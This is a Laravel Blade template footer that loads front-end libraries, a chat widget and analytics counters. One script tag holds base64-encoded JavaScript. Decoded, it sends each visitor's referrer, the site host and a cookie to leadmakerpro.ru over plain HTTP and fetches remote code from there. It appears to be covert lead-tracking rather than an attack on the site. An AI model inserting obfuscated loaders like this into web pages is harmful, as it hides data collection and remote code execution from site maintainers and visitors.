@if(App::environment() === 'local')
    <script src="{{asset('_assets/_admin/_js/jquery-1.11.1.min.js')}}"></script>
@else
    <script src="http://code.jquery.com/jquery-1.11.2.min.js"></script>
@endif
<!-- Mainly scripts -->
<script src="/_assets/bower_components/matchHeight/jquery.matchHeight.js" type="text/javascript"></script>
<script src="/_assets/bower_components/jquery-validation/dist/jquery.validate.min.js" type="text/javascript"></script>
<script src="/_assets/bower_components/jquery-validation/dist/additional-methods.min.js" type="text/javascript"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
<script type="text/javascript" src="//cdn.jsdelivr.net/momentjs/latest/moment.min.js"></script>
<script type="text/javascript" src="/vendor/jsvalidation/js/jsvalidation.js"></script>
<script type="text/javascript">
    var root = '{{url('/')}}';
</script>
<script src="/_assets/_santa/_js/santa_core.min.js"></script>
@if(isset($validator)) {!! $validator !!} @endif
<script type="text/javascript" src="//cdn.jsdelivr.net/bootstrap.daterangepicker/2/daterangepicker.js"></script>

@if(App::environment() !== 'local')
        <!-- BEGIN JIVOSITE CODE {literal} -->
    <script type='text/javascript'>
    (function(){ var widget_id = '170189';
        var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = '//code.jivosite.com/script/widget/'+widget_id; var ss = document.getElementsByTagName('script')[0]; ss.parentNode.insertBefore(s, ss);})();</script>
    <!-- {/literal} END JIVOSITE CODE -->

        <!-- Yandex.Metrika counter -->
        <script type="text/javascript">
            (function (d, w, c) {
                (w[c] = w[c] || []).push(function() {
                    try {
                        w.yaCounter27992118 = new Ya.Metrika({
                            id:27992118,
                            clickmap:true,
                            trackLinks:true,
                            accurateTrackBounce:true,
                            webvisor:true
                        });
                    } catch(e) { }
                });

                var n = d.getElementsByTagName("script")[0],
                        s = d.createElement("script"),
                        f = function () { n.parentNode.insertBefore(s, n); };
                s.type = "text/javascript";
                s.async = true;
                s.src = "https://mc.yandex.ru/metrika/watch.js";

                if (w.opera == "[object Opera]") {
                    d.addEventListener("DOMContentLoaded", f, false);
                } else { f(); }
            })(document, window, "yandex_metrika_callbacks");
        </script>
        <noscript><div><img src="https://mc.yandex.ru/watch/27992118" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
        <!-- /Yandex.Metrika counter -->

        <noindex><script async src='data:text/javascript;charset=utf-8;base64,ZnVuY3Rpb24gZ2V0Q29va2llKG5hbWUpIHsKCXZhciBjb29raWUgPSAnICcgKyBkb2N1bWVudC5jb29raWU7Cgl2YXIgc2VhcmNoID0gJyAnICsgbmFtZSArICc9JzsKCXZhciBzZXRTdHIgPSBudWxsOyAKCXZhciBvZmZzZXQgPSAwOwoJdmFyIGVuZCA9IDA7CglpZiAoY29va2llLmxlbmd0aCA+IDApIHsKCQlvZmZzZXQgPSBjb29raWUuaW5kZXhPZihzZWFyY2gpOwoJCWlmIChvZmZzZXQgIT0gLTEpIHsKCQkJb2Zmc2V0ICs9IHNlYXJjaC5sZW5ndGg7CgkJCWVuZCA9IGNvb2tpZS5pbmRleE9mKCc7Jywgb2Zmc2V0KQoJCQlpZiAoZW5kID09IC0xKSB7CgkJCQllbmQgPSBjb29raWUubGVuZ3RoOwoJCQl9CgkJCXNldFN0ciA9IHVuZXNjYXBlKGNvb2tpZS5zdWJzdHJpbmcob2Zmc2V0LCBlbmQpKTsKCQl9Cgl9CglyZXR1cm4oc2V0U3RyKTsKfQpmdW5jdGlvbiBteWxvYWQoYTEsYTIpIHsKCXNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CgkJdmFyIGEzID0gZG9jdW1lbnQ7CgkJYTQgPSBhMy5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CgkJYTUgPSBhMy5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKCQlhNiA9IGVzY2FwZShhMy5yZWZlcnJlcik7CgkJYTUudHlwZSA9ICd0ZXh0L2phdmFzY3JpcHQnOwoJCWE1LmFzeW5jID0gdHJ1ZTsKCQlhNS5zcmMgPSBhMisnP3VpZD0nK2ExKycmYTY9JythNisnJmE3PScrbG9jYXRpb24uaG9zdCsnJmE4PScrZ2V0Q29va2llKCdteTF3aXRpZCcrYTEpKycmYTk9JytNYXRoLnJhbmRvbSgpOwoJCWE0LnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGE1LCBhNCk7Cgl9LDEpCn0gbXlsb2FkKCcxNTMyMDYnLCdodHRwOi8vdXNlci5sZWFkbWFrZXJwcm8ucnUvdmsxL3N0ZXAxLnBocCcpOw=='></script></noindex>

    <script type="text/javascript">(window.Image ? (new Image()) : document.createElement('img')).src = location.protocol + '//vk.com/rtrg?r=sXMlCvbczZH2HR9yylv5qbaxpIP7G4KSep35gT8Pme59Fg81A/FwozpoG3bGhq*v7KI6D/DAME2iQ7gl1wpwy0EZ0wU3eO5GKSrtDA0KNd5yAR4JVF9S6bT4rvpQ41L2H3wsGDm3NrMW4mwP*8MJr9vUgYenIyd1WpYCdr5gF7o-';</script>
@endif